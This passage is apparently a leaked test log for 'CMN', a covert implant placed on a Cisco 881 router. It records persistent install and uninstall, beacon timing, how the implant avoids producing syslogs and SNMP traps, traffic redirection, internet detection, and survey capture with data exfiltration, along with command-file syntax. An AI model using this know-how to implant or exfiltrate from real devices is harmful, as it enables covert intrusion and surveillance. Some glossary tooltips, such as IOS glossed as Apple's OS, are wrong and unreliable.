<li>Tested beacons, no <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> Trap</li>
<li>Uploaded redir module and then uploaded survey modules. No trap.</li>
<li>Uploaded redir rules as well as survey for 80 and 53 rules.</li>
<li>removed survey scenario</li>
<li>Performed show survey - no scenarios uploaded</li>
<li>Attemped to upload a cmd file from send directory - just received regular beacon and the cmd file was not picked up</li>
<li>Performed a redir show and saw no rules present - expected rules to be present since I had uploaded them - rules had a timer to expire</li>
<li>Re-uploaded rules with a longer timer</li>
<li>Disabled one rule, then deleted both rules - no traps throughout this test.</li>
<li>Deleted both modules</li>
<li>Uploaded both modules and configured an interface redirection rule, and a reverse to match, to redirect the seeds host from <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> to 172.20.13.10</li>
<li>Tested the rule by web browsing from Seeds host and rule works as expected</li>
<li>Setup the survey rule again - this time i let it run for 10 minutes and then exfilled the data successfully.</li>
<li>Performed a device show config</li>
<li>Changed beacon interval to 20s - beacons arriving every 20s</li>
<li>Performed a device stick:<br><p>881-Top#show rom<br>ReadOnly <span class="glossary">ROMMON<span class="glossary-tt">Read-Only Memory Monitor Cisco bootstrap program</span></span> version:</p>
<p>System Bootstrap, Version 12.4(22r)YB5, RELEASE SOFTWARE (fc1)<br>Technical Support: <span class="external">http://www.cisco.com/techsupport</span><br>Copyright (c) 2009 by cisco Systems, Inc.</p>
<p>No upgrade <span class="glossary">ROMMON<span class="glossary-tt">Read-Only Memory Monitor Cisco bootstrap program</span></span> programmed or not yet run<br>Currently running <span class="glossary">ROMMON<span class="glossary-tt">Read-Only Memory Monitor Cisco bootstrap program</span></span> from ReadOnly region<br>ROMMON from Upgrade region is selected for next boot</p>
<p>881-Top#</p>
</li>
<li><p>No syslogs or <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> traps observed during all tests so far</p></li>
<li>Performed a device level 1 uninstall - no syslogs, console logs or <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> traps observed during any of the above testing.</li>
<li>Reinstalled <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and both modules, changed beacon interval to 20s, then stuck it</li>
<li>Rebooted and it came back and began beaconing every 20s as expected after a few minutes</li>
<li>It returned with only the base CMN, no modules, as expected.</li>
<li>next test might be uninstall with level 0 instead of 1</li>
<li>Uninstalled with level 0, beacons stopped coming in every 20s.  Rebooted and beacons started back, <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> was present with no modules.</li>
<li>Sent uninstall with level 0 again, repeated step x - same result</li>
<li>Uninstall with level 1 - <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> stopped beaconing and now show rom says it will boot from read-only on next boot</li>
<li>Rebooted device to clear <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - no traps, console logs or syslogs observed</li>
</ol>
</li>
<li>Boot times<ol>
<li>Establish baseline with no CMN, no traffic, time from when pings stop to pings beginning again - 3 reboots - 1m50s, 1m45s, 1m49s</li>
<li>Install <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> sticky-norb, uploaded module, changed beacon time to 10s.</li>
<li>Rebooted, waited for beaconing every 10s to resume between each reboot - 2m31s, 2m29s, 2m29s</li>
</ol>
</li>
<li>Test Upgrade/Downgrade <span class="glossary">IOS<span class="glossary-tt">Apple operating system for small devices</span></span> while <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> present<ol>
<li>DUT implanted with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> persistently, beaconing every 10s</li>
<li>Reload in order to perform Upgrade <span class="glossary">IOS<span class="glossary-tt">Apple operating system for small devices</span></span> from 15.1(2)T4 to 15.2(4)M3</li>
<li>DUT did not complete boot process after reload, got an error message "no sreloc section", then <span class="glossary">IOS<span class="glossary-tt">Apple operating system for small devices</span></span> loaded and it looked like config from <span class="glossary">NVRAM<span class="glossary-tt">Non-volatile Random Access Memory</span></span> was loaded, 881 gave an error message about configuring a config-key, and then was hung.  Could not get a response on console or over telnet.  Sent break and then it finally finished the boot, seems like the tripwire worked.  CMN not sending beacons, but 881 did finish booting and is back up.</li>
<li>Downgraded code back to 15.1(2)T4 - <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> booted without a problem</li>
<li>Attempted to reproduce step b - reproduced issue.  </li>
<li>Next step - confirm that this does not happen without <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> loaded.</li>
<li>Recovered by sending break, downgrading <span class="glossary">IOS<span class="glossary-tt">Apple operating system for small devices</span></span> and then I got beacons again.. Uninstalled <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> with level 1</li>
<li>Was able to perform <span class="glossary">IOS<span class="glossary-tt">Apple operating system for small devices</span></span> upgrade without <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> installed.  Created <span class="glossary">JIRA<span class="glossary-tt">User Managment Software (Atlassian)</span></span> issue for<span style="color: rgb(255,0,0);"> 15.2(4)M3 CMN5.</span>
</li>
</ol>
</li>
<li>
<span style="color: rgb(0,0,0);">Test Tool Upgrade command</span><ol>
<li><span style="color: rgb(0,0,0);">Start with clean DUT, no <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> installed</span></li>
<li><span style="color: rgb(0,0,0);">Establish <span class="glossary">FLX<span class="glossary-tt">Fluxwire</span></span> connection</span></li>
<li><span style="color: rgb(0,0,0);">Upload <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> sticky norb with beacon interval set to every 7 days</span></li>
<li><span style="color: rgb(0,0,0);">Rx'd beacon on Spicerack - uploaded both modules</span></li>
<li><span style="color: rgb(0,0,0);">Created another <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> 880-norb-sticky build with a built-in 1min beacon interval and copied 880 directory containing .upgrade file over to Spicerack /opt/pepper/cmds/</span></li>
<li>
<span style="color: rgb(0,0,0);">Found that the example command is not correct in pepper:</span><br><span style="color: rgb(0,0,0);"><span style="color: rgb(0,0,0);"> </span></span><p>[root@blot-spicerack cmds]# more device_upgrade.cmd <br># Command Name: UPGRADE IMPLANT<br># parameter1: the path to the cmn-upgrade-&lt;platform&gt;.elf file that will be sent<br># to the implant. <br>#<br>device_upgrade|cinnamon_upgrade.elf<br>[root@blot-spicerack cmds]# <br><span style="color: rgb(255,0,0);">It should reference .upgrade file - CMN-6</span></p>
</li>
<li><span style="color: rgb(0,0,0);">Used device_upgrade to upgrade <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> to the version that beacons every 1 min</span></li>
<li>
<span style="color: rgb(0,0,0);">Upgrade loaded successfully:</span><br><p>Total commands reporting status: 1</p>
<p>Command: 1<br> Module: 1<br> Command: 1<br> Status: SUCCESS</p>
</li>
<li>Rebooted <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> to move to the new upgrade version in ROMMON</li>
<li>Verified that the new version did load by checking the Build Time:<br><p>[Versioning]<br>Cinnamon Version = 5.0.0 Jun 26 2015 - 10:49:04</p>
</li>
<li><p>New version will not beacon every minute as I thought even though it was built with that setting in the cinnamon.cfg file.  This is due to the previous persistent version already present on the <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> before upgrade.  The persistent implant config data was already saved to <span class="glossary">NVRAM<span class="glossary-tt">Non-volatile Random Access Memory</span></span> and this will take precendence over the settings build into the <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> base implant.  </p></li>
<li>Successfully updated the beacon interval using the pepper command beacon_interval.</li>
</ol>
</li>
<li>Testing Internet Detection<ol>
<li>DUT currently implanted with sticky norb, beaconing every 1 minute, seeds traffic had been running, just wget.</li>
<li>Stopped seeds traffic.</li>
<li>Changed learning repeat interval through pepper command to be 120s. - module 2 acknowledged success</li>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> - will see if it is able to beacon once it's back up</li>
<li>DUT came back up and as expected, it was not able to beacon even after the <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> was up for 12 minutes</li>
<li>I turned Seeds traffic on and <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> then began to beacon - <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> must have learned the interfaces during the learning phase, even without seed traffic.  CMN can then perform Internet Detection all the time, and as soon as it sees the internet connection, it will attempt the beacon with the expired timer that it couldn't attempt to send earlier.  Internet Detection continues until internet detected, then backoff delay of 1 minute if detected.</li>
<li>Next step - test with different <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server (non-recursive) on Seeds traffic.</li>
<li><p>watch -n2 wget -nv -T 1 -O /dev/null <span class="external">http://alias.google.com</span></p></li>
<li><p>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> to clear out learned interfaces and internet detection</p></li>
<li>Set Seeds to use <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span> as <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server - never could get <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> to beacon, timed or triggered.</li>
<li>Changed Seeds to use 4.4.4.4 - never could get <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> to beacon in response to a trigger</li>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> - <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> beaconing in response to trigger, but not timed beacons</li>
<li>Set beacon interval to every 1 minute - beacon response to trigger, but do not received timed beacons</li>
<li>Reloaded DUT, Seeds still on 4.4.4.4 - <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> still responding to trigger through flux, but not receiving timed beacons even after setting to every 20s.  This is because the beacon failsafe timeout had been reached.</li>
<li>Reset the beacon failsafe with bacon - reset command successful.</li>
<li>Reset device to beacon every 2 minutes</li>
<li>Verify Seeds using <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server 4.4.4.4</li>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> to see if it will automatically detect internet with 4.4.4.4 and begin timed beacons every 2 minutes as expected. - Confirmed</li>
<li>Switched seeds to use <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span> - beacons still coming every 2 minutes.  Letting run for more than 10 minutes to account for back off delay.</li>
<li>Beacons worked on <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span> server all night, every two minutes.  Going to reboot and see if it still works with the <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span> <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server</li>
<li>Rebooted 881 and it began beaconing again with <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span> for Seeds traffic.  Verified traffic to <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span> server and see the following in output of tcpdump - <span style="color: rgb(255,0,0);">CMN-7</span>:<br><p>09:18:53.154280 IP <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.50424 &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>.53: 7281+ A? <span class="external">alias.google.com</span>. (34)<br>09:18:53.756970 IP <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.26126 &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>.53: 24123+ A? <span class="external">www.google.com</span>. (32)<br><span style="color: rgb(255,0,0);">09:18:53.759726 IP <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>: <span class="glossary">ICMP<span class="glossary-tt">Internet Control Message Protocol</span></span> host <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> unreachable - admin prohibited, length 118</span><br>09:18:55.169643 IP <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.57481 &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>.53: 34067+ AAAA? <span class="external">alias.google.com</span>. (34)<br>09:18:55.172606 IP <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.50223 &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>.53: 51940+ A? <span class="external">alias.google.com</span>. (34)<br>09:18:56.105590 IP <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.29803 &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>.53: 22405+ A? <span class="external">www.suptest.com</span>. (33)<br><span style="color: rgb(255,0,0);">09:18:56.108065 IP <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>: <span class="glossary">ICMP<span class="glossary-tt">Internet Control Message Protocol</span></span> host <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> unreachable - admin prohibited, length 108</span><br>09:18:57.188784 IP <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.38501 &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>.53: 62451+ AAAA? <span class="external">alias.google.com</span>. (34)<br>09:18:57.191526 IP <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.52440 &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>.53: 53376+ A? <span class="external">alias.google.com</span>. (34)<br>09:18:59.206950 IP <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.36149 &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>.53: 47735+ AAAA? <span class="external">alias.google.com</span>. (34)<br>09:18:59.209641 IP <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.555</p>
</li>
<li>
<p>Stopped Seeds traffic to see how long it will keep beaconing - it does, added -v to get more detail on tcpdump output <span class="glossary">ICMP<span class="glossary-tt">Internet Control Message Protocol</span></span> unreachables.</p>
<p>09:39:03.772956 IP (tos 0x0, ttl 254, id 28, offset 0, flags [none], proto <span class="glossary">UDP<span class="glossary-tt">User Datagram Protocol</span></span> (17), length 60)<br> <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.28355 &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>.53: 56049+ A? <span class="external">www.google.com</span>. (32)<br><span style="color: rgb(255,0,0);">09:39:03.775915 IP (tos 0xc0, ttl 62, id 18672, offset 0, flags [none], proto <span class="glossary">ICMP<span class="glossary-tt">Internet Control Message Protocol</span></span> (1), length 138)</span><br><span style="color: rgb(255,0,0);"> <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>: <span class="glossary">ICMP<span class="glossary-tt">Internet Control Message Protocol</span></span> host <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> unreachable - admin prohibited, length 118</span><br><span style="color: rgb(255,0,0);"> IP (tos 0x0, ttl 62, id 51133, offset 0, flags [none], proto <span class="glossary">UDP<span class="glossary-tt">User Datagram Protocol</span></span> (17), length 110)</span><br> <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>.53 &gt; <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.28355: 56049* 1/1/1 <span class="external">www.google.com</span>. A <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> (82)<br>09:39:05.774558 IP (tos 0x0, ttl 254, id 29, offset 0, flags [none], proto <span class="glossary">UDP<span class="glossary-tt">User Datagram Protocol</span></span> (17), length 61)<br> <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.31670 &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>.53: 29828+ A? <span class="external">www.suptest.com</span>. (33)<br><span style="color: rgb(255,0,0);">09:39:05.778277 IP (tos 0xc0, ttl 62, id 18673, offset 0, flags [none], proto <span class="glossary">ICMP<span class="glossary-tt">Internet Control Message Protocol</span></span> (1), length 128)</span><br><span style="color: rgb(255,0,0);"> <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> &gt; <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>: <span class="glossary">ICMP<span class="glossary-tt">Internet Control Message Protocol</span></span> host <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> unreachable - admin prohibited, length 108</span><br><span style="color: rgb(255,0,0);"> IP (tos 0x0, ttl 62, id 51134, offset 0, flags [none], proto <span class="glossary">UDP<span class="glossary-tt">User Datagram Protocol</span></span> (17), length 100)</span><br> <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span>.53 &gt; <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.31670: 29828* 1/1/0 <span class="external">www.suptest.com</span>. A 172.20.13.10 (72)</p>
</li>
<li>Rebooted <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> with no seeds traffic - Device did not beacon</li>
<li>Started Seeds to <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span> and <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> immediately beaconed.</li>
<li>Seeds stopped working after just a few minutes.  Tried restarting seeds process, still doesn't work.  Manual lookups from Seeds host do work.  CMN no longer beaconing.  Only ever sent the first one.</li>
<li>Seeds stopped working, I triggered the implant and it did beacon.  At that time, I noticed seeds was also now working.  I sent a beacon failsafe reset to the implant and now beaconing every 2 min.</li>
<li>Trying to repeat the results - starting with <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> reboot with no Seeds traffic.  Unable to reproduce so far.  This was likely due to <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server issue, manual lookups were likely cached.  Likely caused by someone else making changes on <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server while I was testing.</li>
<li>Test using real web browser requests for Internet detection<ol>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> with no seeds traffic running</li>
<li>Waited until <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> was up and then opened firefox on Seeds host and connected to <span class="external">www.cnn.com</span> (<span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span> was dns server) - success, <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> began beaconing.</li>
</ol>
</li>
<li>Test switch <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> servers after <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> is already up - <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> expected to use newly detected <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server<ol>
<li>CMN running on DUT, using <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span> as the detected <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server</li>
<li>Change <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server on Seeds host to 4.4.4.4</li>
<li>Verified that <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> began sending <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> queries to the newly detected 4.4.4.4 server</li>
</ol>
</li>
</ol>
</li>
<li>Test <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> queries to a <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server that does not perform recursion<ol>
<li>Created a <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server 4.4.4.3 that does not perform recursive queries.</li>
<li>Switched Seeds traffic to 4.4.4.3 Server</li>
<li>Observed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> implant still uses 4.4.4.4 server for <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> queries despite switching Seeds and continues to be able to beacon</li>
<li>No other anomalous output observed - no snmp trap, no syslog message or console message</li>
<li>Created a zone to provide a valid answer for seeds traffic - <span class="external">www.internal.com</span> on 4.4.4.3.  </li>
<li>Changed Seeds traffic to query for <span class="external">www.internal.com</span> - <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> now attempts to perform PROBE DEST lookups from 4.4.4.3 and fails to beacon</li>
<li>Attempt to trigger <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> with IP address - <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> does respond by performing <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> lookup to PROBE_DEST, but never beacons.  This is consistent with User Guide which states that before beaconing, <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> will perform active internet detection steps and if successful, will inititate a beacon.  No distinction made between beaconing by IP address and beaconing using hostname.</li>
<li>Switched back to using 4.4.4.4 for seeds traffic - <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> will now respond to trigger by IP address, after giving it a minute to learn the new <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server</li>
<li>CMN did not resume timed beacons until i reset failsafe.</li>
</ol>
</li>
<li>Test <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> modules after reboot and reupload of modules<ol>
<li>Persistent <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> loaded, <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> has been reboote</li>
<li>Loaded modules to MCN</li>
<li>Setup Redirect and Collect rules</li>
<li>Tested redirect rule from Seeds host, web traffic was redirected per the rule</li>
<li>Sent a .send file that contained two lines - survey_show and redir_show.  Status file indicates both commands successful,<span style="color: rgb(255,0,0);"> however spicerack never receives a .rules file - CMN-8.</span>  I was able to execute redir_show indivually and .rules file shows up in spicerack.</li>
<li>Trying the same two line command file but with redir_show first.  I did receive both the .rules file and the .rcvd file showing the survey scenario</li>
<li>Successfully exfilled data from survey scenario - sent some additional exfil command for non existent scenarios, error messages returned for non-existent scenarios:<br><p>[root@blot-spicerack receive]# more 20150702160823_0000011741.status</p>
<p>[Command Results]<br>Total commands reporting status: 3</p>
<p>Command: 1<br> Module: 5<br> Command: 2<br> Status: FAILURE - 0x00000007</p>
<p>Command: 2<br> Module: 5<br> Command: 2<br> Status: SUCCESS</p>
<p>Command: 3<br> Module: 5<br> Command: 2<br> Status: FAILURE - 0x00000007</p>
</li>
</ol>
</li>
<li>
<p>Test 18 Verify traffic collected by survey module - tunnel, outside tunnel</p>
<ol>
<li>Verified <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> running with both survey and redir modules uploaded, no redir rules or survey scenarios active</li>
<li>Set up <span class="glossary">HTTP<span class="glossary-tt">Hypertext Transfer Protocol</span></span> traffic both inside and outside the tunnel from the Seeds host - wgets to both <span class="external">www.cnn.com</span> and <span class="redact">XXX.XXX.X.X (CORE2[US])</span>
</li>
<li>Created a survey scenario to capture all <span class="glossary">HTTP<span class="glossary-tt">Hypertext Transfer Protocol</span></span> traffic matching Seeds host and source port 80 for 2 minutes with a 30 second window and 10 second start delay, uploaded cmd.<br><p>survey_add_scenario|1|00:00:02:00|00:00:30|protocol|source_addr|source_port|dest_addr<br>survey_add_filter|1|accept|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|80|80|TCP<br>survey_start_scenario|1|offset|00:00:00:10</p>
</li>
<li>
<p>Filter was successful:</p>
<p>[root@blot-spicerack unscramble]# more 20150708204233_0000013898.csv<br>sep=,<br>Scenario ID,1<br>Assigned Start Time,2015-07-08_20:39:02_GMT<br>Actual Start Time,2015-07-08_20:39:02_GMT<br>Duration,120<br>Resolution,30<br>Overflow Count,0<br>Quantifier Fields,Protocol,Source Address,Source Port,Destination Address,<br>Number of Filters,1<br>Number of Entries,8</p>
<p>Filter List<br>Filter ID,Filter Type,Filter Protocol,IP Address,Netmask,Port Start,Port End<br>0,Accept,TCP,<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>,255.255.255.255,80,80</p>
<p>Exfiltration Entries<br>Entry,Matched Filter,First Time,Last Time,Window,Sessions,Packets,Bytes,Source Addr,Source Port,Dest Addr,Dest Port,Protocol<br>0,0,2015-07-08_20:40:32_GMT,2015-07-08_20:41:00_GMT,3,15,105,1635,008.008.008.025,80,100.200.177.010,0,6<br>1,0,2015-07-08_20:40:03_GMT,2015-07-08_20:40:30_GMT,2,14,98,1526,008.008.008.025,80,100.200.177.010,0,6<br>2,0,2015-07-08_20:39:33_GMT,2015-07-08_20:40:01_GMT,1,15,105,1635,008.008.008.025,80,100.200.177.010,0,6<br>3,0,2015-07-08_20:39:02_GMT,2015-07-08_20:39:31_GMT,0,15,105,1635,008.008.008.025,80,100.200.177.010,0,6<br>4,0,2015-07-08_20:40:33_GMT,2015-07-08_20:41:01_GMT,3,12,73,1308,100.255.000.001,80,100.200.177.010,0,6<br>5,0,2015-07-08_20:40:02_GMT,2015-07-08_20:40:31_GMT,2,8,27,545,100.255.000.001,80,100.200.177.010,0,6<br>6,0,2015-07-08_20:39:36_GMT,2015-07-08_20:40:00_GMT,1,10,60,981,100.255.000.001,80,100.200.177.010,0,6<br>7,0,2015-07-08_20:39:03_GMT,2015-07-08_20:39:30_GMT,0,9,35,763,100.255.000.001,80,100.200.177.010,0,6</p>
</li>
<li>HTTP replies from both inside and outside the tunnel to the Seeds host iP were captured.  </li>
<li>Created a filter just match traffic for IP <span class="redact">XXX.XXX.X.X (CORE2[US])</span> - collected just the 80 traffic from Seeds host</li>
<li>Ran the same scenario again, this time bouncing t0 on <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> and running a ping to <span class="redact">XXX.XXX.X.X (CORE2[US])</span> during survey - still only port 80 <span class="glossary">TCP<span class="glossary-tt">Transport Control Protocol</span></span> traffic collected.  </li>
<li>Changed the scenario to capture <span class="glossary">UDP<span class="glossary-tt">User Datagram Protocol</span></span> traffic instead of <span class="glossary">TCP<span class="glossary-tt">Transport Control Protocol</span></span> and performed the same tunnel bounce and ping on <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> - when I tried to exfil the data, got the following error message, which indicates nothing to exfil:<br><p>[root@blot-spicerack receive]# more 20150708213455_0000013910.status</p>
<p>[Command Results]<br>Total commands reporting status: 1</p>
<p>Command: 1<br> Module: 5<br> Command: 2<br> Status: FAILURE - 0x0000000c</p>
<p>[root@blot-spicerack receive]#</p>
</li>
<li>Changed the scenario to capture <span class="glossary">TCP<span class="glossary-tt">Transport Control Protocol</span></span> and <span class="glossary">UDP<span class="glossary-tt">User Datagram Protocol</span></span> traffic from the remote tunnel endpoint - <span class="redact">XX.XX.XXX.XXX (GULF-CYBERIAN[AE])</span>.  Collected the following <span class="glossary">UDP<span class="glossary-tt">User Datagram Protocol</span></span> isakmp packets between the endpoints:<br><p>Exfiltration Entries<br>Entry,Matched Filter,First Time,Last Time,Window,Sessions,Packets,Bytes,Source Addr,Source Port,Dest Addr,Dest Port,Protocol<br>0,0,2015-07-08_21:50:09_GMT,2015-07-08_21:50:09_GMT,3,0,2,184,084.047.252.254,500,181.028.148.254,500,17<br>1,0,2015-07-08_21:48:44_GMT,2015-07-08_21:49:09_GMT,1,0,7,980,084.047.252.254,500,181.028.148.254,500,17</p>
</li>
</ol>
</li>
<li>IXIA 3 day test<ol>
<li>Rx the following syslog message during the test:<br><p>Jul 3 00:49:30.266: %IP_VFR-4-FRAG_TABLE_OVERFLOW: Tunnel0: the fragment table has reached its maximum threshold 16<br>Jul 3 00:56:15.306: %IP_VFR-4-FRAG_TABLE_OVERFLOW: Tunnel0: the fragment table has reached its maximum threshold 16<br>From show ip traffic:</p>
<p>Frags: 629988 reassembled, 0 timeouts, 0 couldn't reassemble<br> 630009 fragmented, 1890036 fragments, 0 couldn't fragment</p>
</li>
<li><p>This also generated corresponding <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> Traps<br><span style="color: rgb(0,0,0);">clogHistTimestamp.6 = 2077441 </span><br><span style="color: rgb(0,0,0);">clogHistMsgText.6 = Tunnel0: the fragment table has reached its maximum threshold 16 </span><br><span style="color: rgb(0,0,0);">clogHistMsgName.6 = FRAG_TABLE_OVERFLOW </span><br><span style="color: rgb(0,0,0);">clogHistSeverity.6 = 5 </span><br><span style="color: rgb(0,0,0);">clogHistFacility.6 = IP_VFR </span><br><span style="color: rgb(0,0,0);">snmpTrapOID = CISCO-SYSLOG-MIB:clogMessageGenerated </span><br><span style="color: rgb(0,0,0);">sysUpTime = 5 hours 46 minutes 14.44 seconds </span></p></li>
<li><p><span style="color: rgb(0,0,0);">Peak memory used during the test actually slightly lower than during the 1 day test without <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - (with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> about 56%, without 60%)</span></p></li>
<li><p><span style="color: rgb(0,0,0);">CPU higher during test with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - peak hits about 30% higher with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> about 90%, without 60%.  Sustained CPU also higher with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - less than 10% without CMN, closer to 15% with</span></p></li>
<li><p>CMN timed beacons not working - due to IXIA traffic, timed beacons had failed and failsafe tripped.  CMN does respond to trigger.  Reset beacon failsafe.</p></li>
